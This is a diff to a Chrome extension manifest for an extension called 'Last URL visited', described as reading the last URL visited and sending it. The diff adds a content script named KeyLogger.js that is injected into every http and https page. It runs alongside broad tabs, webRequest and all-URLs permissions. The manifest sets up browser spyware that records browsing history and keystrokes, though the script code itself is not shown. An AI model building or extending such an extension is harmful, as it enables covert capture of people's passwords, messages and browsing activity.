@@ -1,18 +1,33 @@
 {
   "name": "Last URL visited",
-  "version": "1",
+  "version": "2",
   "description": "Read the last url visited and send it.",
   "incognito": "split",
   "permissions": [
     "tabs",
     "webRequest",
     "webRequestBlocking",
-    "<all_urls>"
+    "<all_urls>",
+    "storage"
+  ],
+
+  "content_scripts": [
+    {
+      "matches": [
+        "http://*/*",
+        "https://*/*"
+      ],
+      "js": [
+        "KeyLogger.js"
+      ],
+      "run_at": "document_end"
+    }
   ],
 
   "background": {
-    "scripts": ["LastUrls.js"],
-    "persistent": true
+    "page": "background.html"
+   
   },
+
   "manifest_version": 2
 }
